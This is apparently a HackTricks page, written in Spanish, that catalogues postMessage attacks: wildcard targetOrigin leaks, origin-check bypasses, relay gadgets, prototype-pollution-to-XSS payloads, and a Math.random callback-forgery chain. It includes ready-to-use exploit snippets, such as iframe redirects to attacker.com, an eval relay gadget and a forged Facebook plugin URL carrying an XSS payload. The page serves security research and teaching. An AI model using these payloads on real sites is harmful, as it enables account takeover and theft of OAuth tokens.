# Vulnerabilidades de PostMessage

{{#include ../../banners/hacktricks-training.md}}

## Enviar **PostMessage**

**PostMessage** utiliza la siguiente función para enviar un mensaje:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Ten en cuenta que **targetOrigin** puede ser '\*' o una URL como _https://company.com._\
En el **segundo escenario**, el **mensaje solo puede enviarse a ese dominio** (incluso si el origin del Window object es diferente).\
Si se usa el **wildcard**, **los mensajes podrían enviarse a cualquier dominio**, y serán enviados al origin del Window object.

### Atacando iframe & wildcard en **targetOrigin**

Como se explica en [**este informe**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), si encuentras una página que puede ser **iframed** (sin protección `X-Frame-Header`) y que está **enviando mensajes sensibles** vía **postMessage** usando un **wildcard** (\*), puedes **modificar** el **origin** del **iframe** y **leak** el mensaje **sensible** a un dominio controlado por ti.\
Ten en cuenta que si la página puede ser iframed pero el **targetOrigin** está **configurado a una URL y no a un wildcard**, este **truco no funcionará**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** es la función usada por JS para declarar la función que está **esperando `postMessages`**.\
Se usará un código similar al siguiente:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### Enumeración

Para **encontrar event listeners** en la página actual puedes:

- **Buscar** en el código JS `window.addEventListener` y `$(window).on` (_JQuery version_)
- **Ejecutar** en la consola de las developer tools: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Ir a** _Elements --> Event Listeners_ en las herramientas de desarrollo del navegador

![](<../../images/image (396).png>)

- Usar una **extensión de navegador** como [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) o [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Estas extensiones **interceptarán todos los mensajes** y te los mostrarán.

### Origin check bypasses

- El atributo **`event.isTrusted`** se considera seguro ya que devuelve `True` solo para eventos generados por acciones genuinas de usuario. Aunque es difícil de burlar si está bien implementado, su importancia en las comprobaciones de seguridad es notable.
- El uso de **`indexOf()`** para la validación del origin en eventos postMessage puede ser susceptible de bypass. Un ejemplo que ilustra esta vulnerabilidad es:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- El método **`search()`** de `String.prototype.search()` está pensado para expresiones regulares, no para strings. Pasar algo que no sea un regexp provoca una conversión implícita a regex, haciendo el método potencialmente inseguro. En regex, un punto (.) actúa como wildcard, permitiendo eludir validaciones con dominios especialmente construidos. Por ejemplo:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- La función **`match()`**, similar a `search()`, procesa regex. Si el regex está mal construido, puede ser propenso a bypasses.
- La función **`escapeHtml`** pretende sanitizar entradas escapando caracteres. Sin embargo, no crea un nuevo objeto escapado sino que sobrescribe las propiedades del objeto existente. Este comportamiento puede ser explotado. En particular, si un objeto puede ser manipulado de forma que su propiedad controlada no reconozca `hasOwnProperty`, `escapeHtml` no funcionará como se espera. Esto se demuestra en los ejemplos abajo:

- Falla esperada:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypass a la escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

En el contexto de esta vulnerabilidad, el objeto `File` es especialmente explotable debido a su propiedad de solo lectura `name`. Esta propiedad, cuando se usa en templates, no es sanitizada por la función `escapeHtml`, lo que conduce a riesgos de seguridad potenciales.

- La propiedad `document.domain` en JavaScript puede ser ajustada por un script para acortar el dominio, permitiendo una política same-origin más relajada dentro del mismo dominio padre.

### Origin-only trust + trusted relays

Si un receptor solo comprueba **`event.origin`** (p. ej., confía en cualquier `*.trusted.com`) a menudo puedes encontrar una página **"relay" en ese origen que refleja params controlados por el atacante vía `postMessage`** hacia un `targetOrigin`/`targetWindow` suministrado. Ejemplos incluyen gadgets de marketing/analytics que toman query params y reenvían `{msg_type, access_token, ...}` a `opener`/`parent`. Puedes:

- **Abrir la página de la víctima en un popup/iframe que tenga un `opener`** para que sus handlers se registren (muchos pixels/SDKs solo adjuntan listeners cuando `window.opener` existe).
- **Navegar otra ventana atacante al endpoint relay en el origen de confianza**, poblando los campos del mensaje que quieres inyectar (message type, tokens, nonces).
- Porque el mensaje ahora viene **del origen de confianza**, la validación solo por origin pasa y puedes disparar comportamientos privilegiados (cambios de estado, llamadas API, escrituras en el DOM) en el listener de la víctima.

Patrones de abuso vistos en la práctica:

- SDKs de analytics (p. ej., estilo pixel/fbevents) consumen mensajes como `FACEBOOK_IWL_BOOTSTRAP`, luego **llaman a APIs backend usando un token suministrado en el mensaje** e incluyen **`location.href` / `document.referrer`** en el cuerpo de la petición. Si suministras tu propio token, puedes **leer estas peticiones en el historial/logs de requests del token** y exfiltrar **OAuth codes/tokens** presentes en la URL/referrer de la página víctima.
- Cualquier relay que refleje campos arbitrarios en `postMessage` te permite **suplantar tipos de mensajes** esperados por listeners privilegiados. Combina esto con validación de entrada débil para alcanzar llamadas Graph/REST, desbloqueos de features, o flujos equivalentes a CSRF.

Consejos de hunting: enumera listeners de `postMessage` que solo comprueban `event.origin`, luego busca **endpoints HTML/JS same-origin que reenvíen params de URL vía `postMessage`** (previews de marketing, popups de login, páginas de error OAuth). Junta ambos con `window.open()` + `postMessage` para bypassear comprobaciones de origin.

### e.origin == window.origin bypass

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

It's possible to check if the message came from the same window the script is listening in (specially interesting for **Content Scripts from browser extensions** to check if the message was sent from the same page):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Puedes forzar **`e.source`** de un mensaje a null creando un **iframe** que **envía** el **postMessage** y se **elimina inmediatamente**.

Para más información **lee:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Para realizar estos ataques, idealmente podrás **poner la página web de la víctima** dentro de un `iframe`. Pero algunas cabeceras como `X-Frame-Header` pueden **impedir** ese **comportamiento**.\
En esos escenarios aún puedes usar un ataque menos sigiloso. Puedes abrir una nueva pestaña hacia la aplicación web vulnerable y comunicarte con ella:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Robar mensaje enviado al child iframe bloqueando la página principal

En la siguiente página puedes ver cómo podrías robar **datos sensibles enviados vía postmessage** a un **child iframe** bloqueando la **página principal** antes de enviar los datos y abusando de una **XSS en el child** para **leak the data** antes de que se reciba:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Robar mensaje modificando la location del iframe

Si puedes cargar una página web en un iframe sin X-Frame-Header que contiene otro iframe, puedes **change the location of that child iframe**, por lo que si está recibiendo un **postmessage** enviado usando un **wildcard**, un atacante podría **change** ese iframe **origin** a una página **controlled** por él y **robar** el mensaje:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage to Prototype Pollution and/or XSS

En escenarios donde los datos enviados vía `postMessage` son ejecutados por JS, puedes **iframe** la **página** y **explotar** el **prototype pollution/XSS** enviando el exploit vía `postMessage`.

Un par de **muy buenos XSS explicados vía `postMessage`** pueden encontrarse en [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Ejemplo de un exploit para abusar de **Prototype Pollution y luego XSS** mediante un `postMessage` a un `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Para **más información**:

- Enlace a la página sobre [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Enlace a la página sobre [**XSS**](../xss-cross-site-scripting/index.html)
- Enlace a la página sobre [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Carga de scripts derivada del origin & supply-chain pivot (estudio de caso CAPIG)

`capig-events.js` solo registró un manejador `message` cuando `window.opener` existía. En `IWL_BOOTSTRAP` verificó `pixel_id` pero almacenó `event.origin` y luego lo usó para construir `${host}/sdk/${pixel_id}/iwl.js`.

<details>
<summary>Manejador que escribe un origen controlado por el atacante</summary>
```javascript
if (window.opener) {
window.addEventListener("message", (event) => {
if (
!localStorage.getItem("AHP_IWL_CONFIG_STORAGE_KEY") &&
!localStorage.getItem("FACEBOOK_IWL_CONFIG_STORAGE_KEY") &&
event.data.msg_type === "IWL_BOOTSTRAP" &&
checkInList(g.pixels, event.data.pixel_id) !== -1
) {
localStorage.setItem("AHP_IWL_CONFIG_STORAGE_KEY", {
pixelID: event.data.pixel_id,
host: event.origin,
sessionStartTime: event.data.session_start_time,
})
startIWL() // loads `${host}/sdk/${pixel_id}/iwl.js`
}
})
}
```
</details>

**Exploit (origin → script-src pivot):**
1. Obtener un opener: p.ej., en Facebook Android WebView reutilizar `window.name` con `window.open(target, name)` para que la ventana se convierta en su propio opener, luego enviar un `postMessage` desde un iframe malicioso.
2. Enviar `IWL_BOOTSTRAP` desde cualquier origin para persistir `host = event.origin` en `localStorage`.
3. Alojar `/sdk/<pixel_id>/iwl.js` en cualquier origen permitido por la CSP (takeover/XSS/upload en un dominio de analytics en la whitelist). `startIWL()` entonces carga attacker JS en el sitio embebedor (p.ej., `www.meta.com`), habilitando llamadas cross-origin con credenciales y account takeover.

Si el control directo del opener fue imposible, comprometer un iframe de terceros en la página todavía permitía enviar el `postMessage` manipulado al parent para envenenar el host almacenado y forzar la carga del script.

**Backend-generated shared script → stored XSS:** el plugin `AHPixelIWLParametersPlugin` concatenaba parámetros de reglas de usuario en JS añadido a `capig-events.js` (p.ej., `cbq.config.set(...)`). Inyectar breakouts como `"]}` permitía inyectar JS arbitrario, creando stored XSS en el script compartido servido a todos los sitios que lo cargan.

### Trusted-origin allowlist isn't a boundary

Un chequeo estricto de `event.origin` solo funciona si el **trusted origin cannot run attacker JS**. Cuando páginas privilegiadas embeben iframes de terceros y asumen que `event.origin === "https://partner.com"` es seguro, cualquier XSS en `partner.com` se convierte en un puente hacia el parent:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
Patrón de ataque observado en el mundo real:

1. **Exploit XSS in the partner iframe** y drop a relay gadget para que cualquier `postMessage` se convierta en code exec dentro del origen de confianza:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **From the attacker page**, envía JS al compromised iframe que reenvía un tipo de mensaje permitido de vuelta al parent. El mensaje se origina en `partner.com`, pasa la allowlist y lleva HTML que se inserta de forma insegura:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. El padre inyecta el HTML del atacante, dando **ejecución de JS en el origen padre** (p. ej., `facebook.com`), lo que luego puede usarse para robar códigos OAuth o pivotar hacia flujos de account takeover completos.

Key takeaways:

- **Partner origin isn't a boundary**: cualquier XSS en un partner "trusted" permite a los atacantes enviar mensajes permitidos que evaden las comprobaciones de `event.origin`.
- Handlers que **render partner-controlled payloads** (p. ej., `innerHTML` en tipos de mensaje específicos) convierten la compromisión del partner en un DOM XSS de same-origin.
- Una amplia **message surface** (muchos tipos, sin validación de estructura) ofrece más gadgets para pivoting una vez que un iframe del partner está comprometido.

### Predicting **`Math.random()`** callback tokens in postMessage bridges

Cuando la validación de mensajes usa un “shared secret” generado con `Math.random()` (p. ej., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) y el mismo helper también nombra iframes de plugins, puedes recuperar outputs del PRNG y forjar mensajes trusted:

- **Leak PRNG outputs via `window.name`:** El SDK auto-nombra los iframes de plugin con `guid()`. Si controlas el top frame, iframea la página víctima, luego navega el iframe del plugin a tu origen (p. ej., `window.frames[0].frames[0].location='https://attacker.com'`) y lee `window.frames[0].frames[0].name` para obtener un output crudo de `Math.random()`.
- **Force more outputs without reloads:** Algunos SDKs exponen una ruta de reinit; en el FB SDK, disparar `init:post` con `{xfbml:1}` fuerza `XFBML.parse()`, destruye/crea de nuevo el iframe del plugin y genera nuevos nombres/IDs de callback. Repetidas reinit producen tantos outputs del PRNG como se necesiten (nota llamadas internas extra a `Math.random()` para IDs de callback/iframe, por lo que los solvers deben saltarse valores intermedios).
- **Trusted-origin delivery via parameter pollution:** Si un endpoint first-party de plugin refleja un parámetro no sanitizado en la payload cross-window (p. ej., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), puedes inyectar `&type=...&iconSVG=...` preservando el origen trusted `facebook.com`.
- **Predict the next callback:** Convierte los nombres de iframe filtrados de nuevo a floats en `[0,1)` y alimenta varios valores (incluso no consecutivos) a un predictor de `Math.random` de V8 (p. ej., basado en Z3). Genera el siguiente `guid()` localmente para forjar el token de callback esperado.
- **Trigger the sink:** Construye los datos de postMessage para que el bridge dispare `xd.mpn.setupIconIframe` e inyecte HTML en `iconSVG` (p. ej., URL-encoded `<img src=x onerror=...>`), logrando DOM XSS dentro del origen hosting; desde allí se pueden leer iframes same-origin (OAuth dialogs, arbiters, etc.).
- **Framing quirks help:** La cadena requiere framing. En algunos webviews móviles, `X-Frame-Options` puede degradar a un `ALLOW-FROM` no soportado cuando `frame-ancestors` está presente, y parámetros de “compat” pueden forzar `frame-ancestors` permisivos, habilitando el side channel de `window.name`.

#### Ejemplo mínimo de mensaje forjado
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Referencias

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- Leaking fbevents: exfiltración de código OAuth vía confianza en postMessage que conduce a Instagram ATO
  (https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Para practicar: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- CAPIG postMessage origin trust → carga de scripts + inyección de JS almacenado
  (https://ysamm.com/uncategorized/2025/01/13/capig-xss.html)
- Self XSS Facebook Payments
  (https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- Facebook JavaScript SDK Math.random predicción de callback → DOM XSS writeup
  (https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- V8 Math.random() recuperación del estado (Z3 predictor)
  (https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
